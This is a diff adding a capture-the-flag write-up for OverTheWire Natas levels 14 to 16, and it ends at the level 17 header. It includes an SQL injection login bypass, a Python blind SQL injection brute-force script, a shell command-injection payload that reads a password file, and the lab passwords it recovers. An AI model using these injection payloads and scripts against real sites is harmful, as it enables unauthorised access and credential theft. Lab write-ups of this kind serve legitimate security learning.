@@ -293,8 +293,130 @@ Username: natas14
 URL:      http://natas14.natas.labs.overthewire.org
 ```
 
+The website is using SQL to get a username and password onto the website. Looking onto the source code it seems that the query is displayed like this:
 
+> `SELECT * from users where username="(user)"and password="(pass)";`
 
+Since we can put anything on the input, you can just leave the username blank, and put `"  or "1"="1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.
 
+```
+Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+```
+
+# 15
+
+```
+Username: natas15
+URL:      http://natas15.natas.labs.overthewire.org
+```
+
+The website uses SQL to check if a user exists. Just like the previous level, the input is unfiltered, but it looks like we need to brute force the password ourselves. We can use `natas16` as the user because it exists.
+
+Instead of using the text box we can use the URL instead. After the index.php, we can try doing  `SELECT * from users where username="natas16" and password LIKE BINARY "(pass)%"`. The LIKE BINARY will help us compare the password input case-sensitively, and the % key will fill out the rest of the password, so we can brute force every character until we get the full password.  We can tell if it works because it will say "This user exists", while incorrect passwords are "This user doesn't exist". 
+
+For the sake of time I just looked for other solutions for this level and took [this person's code.](https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas15.md) Brute forcing itself is time consuming anyway. Here's the python code.
+
+> ```python
+> import requests
+> target = 'http://natas15.natas.labs.overthewire.org'
+> charset_0 = (
+> 	'0123456789' +
+> 	'abcdefghijklmnopqrstuvwxyz' +
+> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+> )
+> webauth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
+> charset_1 = ''
+> for c in charset_0:
+> 	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
+> 	r = requests.get(target,
+> 		auth=webauth,
+> 		params={"username": username}
+> 	)
+> 	if "This user exists" in r.text:
+> 		charset_1 += c
+> 		print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+> 
+> password = ""
+> while len(password) != 32:
+> 	for c in charset_1:
+> 		t = password + c
+> 		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
+> 		r = requests.get(target,
+> 			auth=webauth,
+> 			params={"username": username}
+> 		)
+> 		if "This user exists" in r.text:
+> 			print ('PASS: ' + t.ljust(32, '*'))
+> 			password = t
+> 			break
+> ```
+
+Once that's done we get the password.
+
+```
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+```
+
+# 16
+
+```
+Username: natas16
+URL:      http://natas16.natas.labs.overthewire.org
+```
+
+So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello)helium`, it will end up being`hello helium`and return no result.
+
+Looks like we need to bruteforce again... so the command we will use is `(grep -E ^(pass).* /etc/natas_webpass/natas17)helium`. This lets us run a regex expression that runs successfully if the starting characters, `(pass)`, match the start of the password. If it does, it will return a blank message, but wrong characters will just return the words with helium.
+
+I used the same python code from the previous level, but with some changes.
+
+> ```python
+> import requests
+> target = 'http://natas16.natas.labs.overthewire.org'
+> charset_0 = (
+> 	'0123456789' +
+> 	'abcdefghijklmnopqrstuvwxyz' +
+> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+> )
+> webauth = ('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
+> charset_1 = ''
+> 
+> for c in charset_0:
+> 	username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
+> 	r = requests.get(target,
+> 		auth=webauth,
+> 		params={"needle": username}
+> 	)
+> 	if "helium" not in r.text:
+> 		charset_1+=c
+> 		print ('CSET: ' + charset_1.ljust(32, '*'))
+> 
+> password = ""
+> while len(password) != 32:
+> 	for c in charset_1:
+> 		t = password + c
+> 		username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
+> 		r = requests.get(target,
+> 			auth=webauth,
+> 			params={"needle": username}
+> 		)
+> 		if "helium" not in r.text:
+> 			print ('PASS: ' + t.ljust(32, '*'))
+> 			password = t
+> 			break
+> ```
+
+This is the password we get:
+
+```
+XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+```
+
+# 17
+
+```
+Username: natas17
+URL:      http://natas17.natas.labs.overthewire.org
+```
 
 
